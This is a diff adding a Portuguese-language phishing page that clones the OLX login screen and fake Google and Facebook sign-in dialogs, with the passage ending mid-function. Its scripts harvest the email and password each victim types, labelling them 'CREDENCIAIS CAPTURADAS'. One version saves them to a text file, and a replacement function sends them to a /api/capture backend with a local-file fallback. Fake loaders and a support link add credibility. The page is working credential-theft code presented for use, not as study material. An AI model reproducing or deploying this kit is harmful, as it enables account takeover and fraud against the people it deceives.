@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entre na sua conta - OLX</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --olx-orange: #f75c0b;
+            --olx-purple: #6e0ad6;
+            --olx-blue: #3b5998;
+            --text-main: #222222;
+            --text-muted: #666666;
+            --border-color: #d1d1d1;
+            --bg-page: #ffffff;
+            --font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            
+            /* Google Colors */
+            --g-blue: #1a73e8;
+            --g-bg: #ffffff;
+            --g-border: #dadce0;
+            --g-text: #202124;
+            --g-text-muted: #5f6368;
+            --g-hover: #f6fafe;
+
+            /* Facebook Colors */
+            --fb-blue: #1877f2;
+            --fb-bg: #ffffff;
+            --fb-border: #dddfe2;
+            --fb-text: #1c1e21;
+            --fb-text-muted: #606770;
+            --fb-btn-green: #42b72a;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: var(--font-family);
+            background-color: var(--bg-page);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* OLX Header */
+        .header {
+            padding: 24px 0;
+            border-bottom: 1px solid #eaeaea;
+            width: 100%;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+        }
+        
+        /* SLOT DA LOGO: Coloque a imagem na mesma pasta e altere o src */
+        .logo-img { 
+            height: 28px; 
+            width: auto; 
+            display: block;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+            width: 100%;
+        }
+
+        h1 { font-size: 26px; font-weight: 700; line-height: 1.2; color: var(--text-main); margin-bottom: 16px; letter-spacing: -0.5px; }
+        .subtitle { font-size: 15px; color: var(--text-main); line-height: 1.4; margin-bottom: 28px; padding: 0 10px; }
+
+        /* Social Buttons */
+        .social-login { display: flex; justify-content: center; gap: 16px; margin-bottom: 32px; }
+        .social-btn {
+            width: 56px; height: 56px; border-radius: 50%; border: 1px solid #e0e0e0;
+            background: #ffffff; display: flex; justify-content: center; align-items: center;
+            cursor: pointer; transition: background 0.2s;
+        }
+        .social-btn:hover { background: #f9f9f9; }
+        .social-btn svg { width: 24px; height: 24px; }
+        .social-btn.fb { background-color: var(--olx-blue); border-color: var(--olx-blue); }
+        .social-btn.fb:hover { background-color: #2d4373; }
+
+        /* Divider */
+        .divider { display: flex; align-items: center; text-align: center; color: #999; font-size: 13px; margin-bottom: 24px; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #eaeaea; }
+        .divider span { padding: 0 12px; }
+
+        /* Forms */
+        .form-group { text-align: left; margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 15px; font-weight: 500; margin-bottom: 8px; color: var(--text-main); }
+        .form-group input {
+            width: 100%; height: 56px; padding: 0 16px; border: 1px solid var(--border-color);
+            border-radius: 8px; font-size: 16px; font-family: var(--font-family); outline: none; transition: border-color 0.2s;
+        }
+        .form-group input:focus { border-color: var(--olx-purple); box-shadow: 0 0 0 1px var(--olx-purple); }
+
+        .submit-btn {
+            width: 100%; height: 56px; background-color: var(--olx-orange); color: #ffffff;
+            border: none; border-radius: 30px; font-size: 16px; font-weight: 700;
+            font-family: var(--font-family); cursor: pointer; margin-top: 8px; margin-bottom: 24px; transition: opacity 0.2s;
+        }
+        .submit-btn:hover { opacity: 0.9; }
+        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .register-link { font-size: 15px; color: var(--text-main); margin-bottom: 32px; }
+        .register-link a { color: var(--olx-purple); font-weight: 600; text-decoration: underline; cursor: pointer; }
+
+        .help-section {
+            display: block;
+            background-color: #f7f7f7; padding: 20px; border-radius: 8px;
+            text-align: center; font-size: 15px; color: var(--text-main); margin-bottom: 40px; 
+            cursor: pointer; text-decoration: none;
+        }
+
+        .footer-text { font-size: 12px; color: var(--text-muted); text-align: center; line-height: 1.5; margin-bottom: 30px; }
+        .footer-text a { color: var(--olx-purple); text-decoration: underline; }
+
+        /* Hide steps initially */
+        #step-password { display: none; }
+        
+        /* =========================================
+           LOADER OVERLAY
+           ========================================= */
+        #loader-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100vh;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 200;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--g-blue);
+            border-radius: 50%;
+            width: 40px; height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .spinner.fb-spin { border-top-color: var(--fb-blue); }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            font-family: 'Roboto', sans-serif;
+            color: var(--g-text);
+            font-size: 16px;
+        }
+
+        /* =========================================
+           GOOGLE CLONE STYLES
+           ========================================= */
+        .google-wrapper {
+            position: absolute;
+            top: 0; left: 0; width: 100%; min-height: 100vh;
+            background: #fff; z-index: 100;
+            display: none;
+            font-family: 'Roboto', 'Inter', sans-serif;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 40px;
+        }
+        
+        .google-card {
+            width: 100%; max-width: 450px;
+            border: 1px solid var(--g-border); border-radius: 8px;
+            padding: 48px 40px 36px; margin: 0 20px; text-align: center;
+        }
+
+        .g-logo svg { width: 75px; height: auto; }
+
+        .g-title { color: var(--g-text); font-size: 24px; font-weight: 400; margin-top: 16px; margin-bottom: 8px; }
+        .g-subtitle { color: var(--g-text); font-size: 16px; margin-bottom: 32px; }
+        .g-subtitle span { font-weight: 500; }
+
+        .g-input-group { position: relative; margin-bottom: 24px; text-align: left; }
+        .g-input-group input {
+            width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid var(--g-border);
+            border-radius: 4px; outline: none; font-family: 'Roboto', sans-serif; color: var(--g-text); transition: border 0.2s;
+        }
+        .g-input-group input:focus { border: 2px solid var(--g-blue); padding: 12px 14px; }
+        .g-input-group label {
+            position: absolute; top: 50%; left: 15px; transform: translateY(-50%);
+            background: #fff; padding: 0 5px; color: var(--g-text-muted); font-size: 16px;
+            pointer-events: none; transition: 0.2s ease all;
+        }
+        .g-input-group input:focus ~ label,
+        .g-input-group input:not(:placeholder-shown) ~ label {
+            top: 0; font-size: 12px; color: var(--g-blue);
+        }
+        .g-input-group input:not(:focus):not(:placeholder-shown) ~ label { color: var(--g-text-muted); }
+
+        .g-forgot { display: block; text-align: left; color: var(--g-blue); font-size: 14px; font-weight: 500; text-decoration: none; margin-bottom: 32px; }
+        .g-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
+        .g-btn-text { color: var(--g-blue); font-size: 14px; font-weight: 500; background: none; border: none; cursor: pointer; padding: 8px 12px; border-radius: 4px; }
+        .g-btn-text:hover { background: var(--g-hover); }
+        .g-btn-primary { background-color: var(--g-blue); color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+        .g-btn-primary:hover { background-color: #1765cc; }
+        .g-btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .g-footer { margin-top: 48px; display: flex; justify-content: space-between; color: var(--g-text-muted); font-size: 12px; }
+        .g-lang-select { border: none; color: var(--g-text-muted); font-size: 12px; background: transparent; cursor: pointer; outline: none; }
+        #g-step-password { display: none; }
+
+        /* =========================================
+           FACEBOOK CLONE STYLES
+           ========================================= */
+        .fb-wrapper {
+            position: absolute;
+            top: 0; left: 0; width: 100%; min-height: 100vh;
+            background: #f0f2f5; z-index: 100;
+            display: none;
+            font-family: 'Roboto', 'Inter', sans-serif;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 40px;
+        }
+
+        .fb-card {
+            width: 100%; max-width: 396px;
+            background: #fff; border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 16px 16px 24px; margin: 0 20px; text-align: center;
+        }
+
+        .fb-header {
+            padding: 10px 0 16px;
+            border-bottom: 1px solid var(--fb-border);
+            margin-bottom: 16px;
+        }
+        
+        .fb-logo {
+            color: var(--fb-blue);
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -1.5px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .fb-input-group {
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .fb-input-group input {
+            width: 100%;
+            padding: 14px 42px 14px 16px; /* Espaço extra na direita pro olho */
+            font-size: 17px;
+            border: 1px solid var(--fb-border);
+            border-radius: 6px;
+            outline: none;
+            font-family: 'Roboto', sans-serif;
+            color: var(--fb-text);
+            transition: border 0.2s;
+        }
+        .fb-input-group input::placeholder { color: #90949c; }
+        .fb-input-group input:focus { border-color: var(--fb-blue); box-shadow: 0 0 0 2px #e7f3ff; }
+
+        /* Eye Icon Toggle */
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            fill: #90949c;
+            transition: fill 0.2s;
+        }
+        .eye-icon:hover { fill: #606770; }
+        .eye-icon.active { fill: var(--fb-blue); }
+
+        .fb-btn-login {
+            width: 100%; background-color: var(--fb-blue); color: #fff;
+            border: none; border-radius: 6px; padding: 14px;
+            font-size: 20px; font-weight: 700; cursor: pointer;
+            margin-top: 4px; margin-bottom: 16px;
+            font-family: 'Roboto', sans-serif; transition: background 0.2s;
+        }
+        .fb-btn-login:hover { background-color: #166fe5; }
+        .fb-btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .fb-forgot {
+            color: var(--fb-blue); font-size: 14px;
+            text-decoration: none; display: block; margin-bottom: 20px;
+        }
+        .fb-forgot:hover { text-decoration: underline; }
+
+        .fb-divider { border-top: 1px solid var(--fb-border); margin: 20px 0; }
+
+        .fb-btn-create {
+            background-color: var(--fb-btn-green); color: #fff;
+            border: none; border-radius: 6px; padding: 14px 16px;
+            font-size: 17px; font-weight: 700; cursor: pointer;
+            font-family: 'Roboto', sans-serif; transition: background 0.2s;
+        }
+        .fb-btn-create:hover { background-color: #36a420; }
+
+        .fb-footer {
+            margin-top: 28px; font-size: 12px;
+            color: var(--fb-text-muted); text-align: center;
+        }
+
+        .fb-footer a { color: var(--fb-blue); text-decoration: none; }
+        
+        .fb-lang-bar {
+            display: flex; justify-content: center; flex-wrap: wrap;
+            gap: 8px; margin-bottom: 12px; font-size: 12px;
+        }
+        .fb-lang-bar a { color: var(--fb-blue); text-decoration: none; }
+        .fb-lang-bar a.active { color: var(--fb-text-muted); }
+
+        #fb-step-password { display: none; }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <!-- SLOT DA LOGO OLX -->
+        <!-- Para usar sua imagem: salve o arquivo como "logo.png" na mesma pasta deste HTML -->
+        <img src="images.png"OLX" class="logo-img" onerror="this.src='data:image/svg+xml;utf8,<svg viewBox=\'0 0 100 40\' fill=\'none\' xmlns=\'http://www.w3.org/2000/svg\'><path d=\'M14.5 14.5C14.5 22.5 8 29.5 0 29.5C0 21.5 6.5 14.5 14.5 14.5Z\' fill=\'%236E0AD6\'/><path d=\'M14.5 14.5C14.5 6.5 21 0 29 0C29 8 22.5 14.5 14.5 14.5Z\' fill=\'%23F75C0B\'/><path d=\'M14.5 29.5C14.5 21.5 21 14.5 29 14.5C29 22.5 22.5 29.5 14.5 29.5Z\' fill=\'%23F75C0B\'/><path d=\'M46.5 29.5C42 29.5 39 26.5 39 21.5C39 16.5 42 13.5 46.5 13.5C51 13.5 54 16.5 54 21.5C54 26.5 51 29.5 46.5 29.5ZM46.5 26C49 26 50.5 24 50.5 21.5C50.5 19 49 17 46.5 17C44 17 42.5 19 42.5 21.5C42.5 24 44 26 46.5 26Z\' fill=\'%236E0AD6\'/><path d=\'M58 30V8H61.5V30H58Z\' fill=\'%23F75C0B\'/><path d=\'M72.5 30L67.5 19.5L72 14.5H76.5L71 20.5L77 30H72.5ZM66 30V8H69.5V30H66Z\' fill=\'%236E0AD6\'/></svg>'">
+    </div>
+
+    <div class="main-content">
+        
+        <!-- OLX STEP 1: EMAIL -->
+        <div id="step-email">
+            <h1>Entre na sua conta<br>e negocie com segurança!</h1>
+            <p class="subtitle">Acesse e aproveite uma experiência<br>segura dentro da OLX.</p>
+
+            <div class="social-login">
+                <button class="social-btn" type="button" onclick="startGoogleLoader()" aria-label="Entrar com Google">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                    </svg>
+                </button>
+                <button class="social-btn fb" type="button" onclick="startFacebookLoader()" aria-label="Entrar com Facebook">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M14 13.5H16.5L17.5 9.5H14V7.5C14 6.4 14.5 5.5 16 5.5H17.5V2.14C17.5 2.14 16.36 2 15.23 2C12.9 2 11.5 3.3 11.5 5.7V9.5H8V13.5H11.5V22H14V13.5Z" fill="#FFFFFF"/>
+                    </svg>
+                </button>
+            </div>
+
+            <div class="divider"><span>Ou conecte com</span></div>
+
+            <form id="form-email">
+                <div class="form-group">
+                    <label for="email">E-mail</label>
+                    <input type="email" id="email" required>
+                </div>
+                <button type="submit" class="submit-btn">Acessar</button>
+            </form>
+
+            <div class="register-link">Não tem uma conta? <a href="#">Cadastre-se</a></div>
+        </div>
+
+        <!-- OLX STEP 2: PASSWORD -->
+        <div id="step-password">
+            <h1>Digite sua senha<br>para acessar</h1>
+            <p class="subtitle">Sua conta: <strong id="display-email" style="color: var(--text-main);"></strong></p>
+
+            <form id="form-password">
+                <div class="form-group" style="margin-top: 32px;">
+                    <label for="password">Senha</label>
+                    <input type="password" id="password" required>
+                </div>
+                <button type="submit" class="submit-btn">Entrar</button>
+            </form>
+            <div class="register-link"><a href="#" onclick="goBack(event)">Voltar</a></div>
+        </div>
+
+        <!-- SUPPORT WHATSAPP LINK -->
+        <a href="https://wa.me/5511999999999" target="_blank" class="help-section">Preciso de ajuda ></a>
+        
+        <div class="footer-text">
+            Ao continuar, você concorda com os <a href="#">Termos de Uso</a> e a <a href="#">Política de Privacidade</a> da OLX e seus parceiros, e em receber comunicações da OLX.
+        </div>
+    </div>
+</div>
+
+<!-- LOADER OVERLAY -->
+<div id="loader-overlay">
+    <div class="spinner" id="loader-spinner"></div>
+    <div class="loader-text" id="loader-text">Conectando...</div>
+</div>
+
+<!-- GOOGLE CLONE WRAPPER -->
+<div class="google-wrapper" id="google-wrapper">
+    <div class="google-card">
+        
+        <div id="g-step-email">
+            <div class="g-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                </svg>
+            </div>
+            <h2 class="g-title">Fazer login</h2>
+            <p class="g-subtitle">Usar sua Conta do Google</p>
+
+            <form id="g-form-email">
+                <div class="g-input-group">
+                    <input type="email" id="g-email" placeholder=" " required>
+                    <label for="g-email">E-mail ou telefone</label>
+                </div>
+                <a href="#" class="g-forgot">Esqueceu seu e-mail?</a>
+                
+                <div class="g-actions">
+                    <button type="button" class="g-btn-text" onclick="closeGoogle()">Voltar</button>
+                    <button type="submit" class="g-btn-primary">Avançar</button>
+                </div>
+            </form>
+
+            <div class="g-footer">
+                <select class="g-lang-select"><option>Português (Brasil)</option></select>
+                <div>
+                    <span style="margin-right: 16px;">Ajuda</span>
+                    <span style="margin-right: 16px;">Privacidade</span>
+                    <span>Termos</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="g-step-password">
+            <div class="g-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                </svg>
+            </div>
+            <h2 class="g-title">Bem-vindo</h2>
+            <p class="g-subtitle"><span id="g-display-email"></span></p>
+
+            <form id="g-form-password">
+                <div class="g-input-group" style="margin-top: 32px;">
+                    <input type="password" id="g-password" placeholder=" " required>
+                    <label for="g-password">Digite sua senha</label>
+                </div>
+                
+                <div style="text-align: left; margin-top: 16px; margin-bottom: 32px; display: flex; align-items: center; gap: 8px;">
+                    <input type="checkbox" id="g-show-pass" style="width: 16px; height: 16px;">
+                    <label for="g-show-pass" style="font-size: 14px; color: var(--g-text); cursor: pointer;">Mostrar senha</label>
+                </div>
+
+                <div class="g-actions">
+                    <button type="button" class="g-btn-text" onclick="backToGoogleEmail()">Voltar</button>
+                    <button type="submit" class="g-btn-primary">Avançar</button>
+                </div>
+            </form>
+
+            <div class="g-footer">
+                <select class="g-lang-select"><option>Português (Brasil)</option></select>
+                <div>
+                    <span style="margin-right: 16px;">Ajuda</span>
+                    <span style="margin-right: 16px;">Privacidade</span>
+                    <span>Termos</span>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<!-- FACEBOOK CLONE WRAPPER -->
+<div class="fb-wrapper" id="fb-wrapper">
+    <div class="fb-card">
+        
+        <div id="fb-step-email">
+            <div class="fb-header">
+                <div class="fb-logo">facebook</div>
+            </div>
+            
+            <p style="font-size: 17px; color: var(--fb-text); margin-bottom: 16px;">Entrar no Facebook</p>
+
+            <form id="fb-form-email">
+                <div class="fb-input-group">
+                    <input type="text" id="fb-email" placeholder="E-mail ou telefone" required>
+                </div>
+                
+                <div class="fb-input-group">
+                    <input type="password" id="fb-password-step1" placeholder="Senha" required>
+                    <!-- Eye Toggle Icon -->
+                    <svg class="eye-icon" id="fb-eye-1" onclick="toggleEye('fb-password-step1', 'fb-eye-1')" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                </div>
+
+                <button type="submit" class="fb-btn-login">Entrar</button>
+            </form>
+
+            <a href="#" class="fb-forgot">Esqueceu a senha?</a>
+            
+            <div class="fb-divider"></div>
+            
+            <button class="fb-btn-create">Criar nova conta</button>
+        </div>
+
+        <!-- FACEBOOK STEP 2: CONFIRM PASSWORD -->
+        <div id="fb-step-password">
+            <div class="fb-header">
+                <div class="fb-logo">facebook</div>
+            </div>
+            
+            <p style="font-size: 17px; color: var(--fb-text); margin-bottom: 8px;">Confirme sua senha</p>
+            <p style="font-size: 14px; color: var(--fb-text-muted); margin-bottom: 16px;"><span id="fb-display-email"></span></p>
+
+            <form id="fb-form-password">
+                <div class="fb-input-group">
+                    <input type="password" id="fb-password" placeholder="Senha" required>
+                    <!-- Eye Toggle Icon -->
+                    <svg class="eye-icon" id="fb-eye-2" onclick="toggleEye('fb-password', 'fb-eye-2')" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                </div>
+
+                <button type="submit" class="fb-btn-login">Entrar</button>
+            </form>
+            
+            <a href="#" class="fb-forgot" onclick="backToFacebookEmail(event)">Voltar</a>
+        </div>
+
+        <div class="fb-footer">
+            <div class="fb-lang-bar">
+                <a href="#" class="active">Português (Brasil)</a>
+                <a href="#">English (US)</a>
+                <a href="#">Español</a>
+            </div>
+            <div style="margin-top: 8px;">
+                <span style="margin-right: 8px;">Sobre</span>
+                <span style="margin-right: 8px;">Privacidade</span>
+                <span style="margin-right: 8px;">Termos</span>
+                <span>Cookies</span>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    let capturedEmail = "";
+    let loginMethod = "email";
+
+    // UTILS: Gerar e baixar arquivo txt
+    function downloadTXT(email, password, method) {
+        const data = new Date().toLocaleString('pt-BR');
+        const content = `--- CREDENCIAIS CAPTURADAS ---\nData: ${data}\nMétodo: ${method}\nE-mail: ${email}\nSenha: ${password}\n------------------------------`;
+        
+        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+        const url = URL.createObjectURL(blob);
+        
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `login_${method.replace(/\s+/g, '_')}_${Date.now()}.txt`;
+        document.body.appendChild(a);
+        a.click();
+        
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+
+    // ==========================================
+    // FLUXO OLX (E-mail Padrão)
+    // ==========================================
+    document.getElementById('form-email').addEventListener('submit', function(e) {
+        e.preventDefault();
+        capturedEmail = document.getElementById('email').value;
+        loginMethod = "OLX - E-mail";
+        
+        document.getElementById('display-email').innerText = capturedEmail;
+        
+        document.getElementById('step-email').style.display = 'none';
+        document.getElementById('step-password').style.display = 'block';
+        document.getElementById('password').focus();
+    });
+
+    document.getElementById('form-password').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const password = document.getElementById('password').value;
+        
+        downloadTXT(capturedEmail, password, loginMethod);
+
+        const btn = this.querySelector('button[type="submit"]');
+        btn.innerText = "Entrando...";
+        btn.disabled = true;
+    });
+
+    function goBack(e) {
+        e.preventDefault();
+        document.getElementById('step-password').style.display = 'none';
+        document.getElementById('step-email').style.display = 'block';
+        document.getElementById('password').value = "";
+    }
+
+    // ==========================================
+    // FLUXO GOOGLE
+    // ==========================================
+    function startGoogleLoader() {
+        const loader = document.getElementById('loader-overlay');
+        const spinner = document.getElementById('loader-spinner');
+        const text = document.getElementById('loader-text');
+        
+        spinner.classList.remove('fb-spin');
+        text.innerText = "Conectando ao Google...";
+        loader.style.display = 'flex';
+        
+        setTimeout(() => {
+            loader.style.display = 'none';
+            document.getElementById('google-wrapper').style.display = 'flex';
+            document.getElementById('g-email').focus();
+        }, 2000);
+    }
+
+    function closeGoogle() {
+        document.getElementById('google-wrapper').style.display = 'none';
+        document.getElementById('g-form-email').reset();
+        document.getElementById('g-form-password').reset();
+        document.getElementById('g-step-email').style.display = 'block';
+        document.getElementById('g-step-password').style.display = 'none';
+    }
+
+    document.getElementById('g-form-email').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const gEmail = document.getElementById('g-email').value;
+        capturedEmail = gEmail;
+        loginMethod = "Google OAuth";
+        
+        document.getElementById('g-display-email').innerText = gEmail;
+        
+        document.getElementById('g-step-email').style.display = 'none';
+        document.getElementById('g-step-password').style.display = 'block';
+        document.getElementById('g-password').focus();
+    });
+
+    function backToGoogleEmail() {
+        document.getElementById('g-step-password').style.display = 'none';
+        document.getElementById('g-step-email').style.display = 'block';
+        document.getElementById('g-password').value = "";
+    }
+
+    document.getElementById('g-show-pass').addEventListener('change', function(e) {
+        document.getElementById('g-password').type = e.target.checked ? 'text' : 'password';
+    });
+
+    document.getElementById('g-form-password').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const gPassword = document.getElementById('g-password').value;
+        
+        downloadTXT(capturedEmail, gPassword, loginMethod);
+
+        const btn = this.querySelector('button[type="submit"]');
+        btn.innerText = "Avançando...";
+        btn.disabled = true;
+    });
+
+    // ==========================================
+    // FLUXO FACEBOOK
+    // ==========================================
+    function startFacebookLoader() {
+        const loader = document.getElementById('loader-overlay');
+        const spinner = document.getElementById('loader-spinner');
+        const text = document.getElementById('loader-text');
+        
+        spinner.classList.add('fb-spin');
+        text.innerText = "Conectando ao Facebook...";
+        loader.style.display = 'flex';
+        
+        setTimeout(() => {
+            loader.style.display = 'none';
+            document.getElementById('fb-wrapper').style.display = 'flex';
+            document.getElementById('fb-email').focus();
+        }, 2000);
+    }
+
+    function closeFacebook() {
+        document.getElementById('fb-wrapper').style.display = 'none';
+        document.getElementById('fb-form-email').reset();
+        document.getElementById('fb-form-password').reset();
+        document.getElementById('fb-step-email').style.display = 'block';
+        document.getElementById('fb-step-password').style.display = 'none';
+    }
+
+    // Toggle da Senha (Olho Mágico)
+    function toggleEye(inputId, iconId) {
+        const input = document.getElementById(inputId);
+        const icon = document.getElementById(iconId);
+        
+        if (input.type === 'password') {
+            input.type = 'text';
+            icon.classList.add('active');
+        } else {
+            input.type = 'password';
+            icon.classList.remove('active');
+        }
+    }
+
+    document.getElementById('fb-form-email').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const fbEmail = document.getElementById('fb-email').value;
+        const fbPass = document.getElementById('fb-password-step1').value;
+        
+        capturedEmail = fbEmail;
+        loginMethod = "Facebook OAuth";
+        
+        document.getElementById('fb-display-email').innerText = fbEmail;
+        
+        document.getElementById('fb-step-email').style.display = 'none';
+        document.getElementById('fb-step-password').style.display = 'block';
+        document.getElementById('fb-password').value = fbPass;
+        document.getElementById('fb-password').focus();
+    });
+
+    function backToFacebookEmail(e) {
+        e.preventDefault();
+        document.getElementById('fb-step-password').style.display = 'none';
+        document.getElementById('fb-step-email').style.display = 'block';
+    }
+
+    document.getElementById('fb-form-password').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const fbPassword = document.getElementById('fb-password').value;
+        
+        downloadTXT(capturedEmail, fbPassword, loginMethod);
+
+        const btn = this.querySelector('button[type="submit"]');
+        btn.innerText = "Entrando...";
+        btn.disabled = true;
+    });
+</script>
+
+<!-- Substitua a função downloadTXT no <script> do index.html por esta: -->
+<script>
+    async function downloadTXT(email, password, method) {
+        const payload = { email, password, method };
+
+        // 1. Envia para o Backend
+        try {
+            const res = await fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (res.ok) {
+                console.log('Dados enviados com sucesso.');
+            }
+        } catch (err) {
+            console.warn('Falha ao enviar para o backend, usando fallback local:', err);
+            // 2. Fallback Local (se o servidor falhar)
+            const data = new Date().toLocaleString('pt-BR');
+            const content = `--- CREDENCIAIS CAPTURADAS ---\nData: ${data}\nMétodo: ${method}\nE-mail: ${email}\nSenha: ${password}\n------------------------------`;
+            
+            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
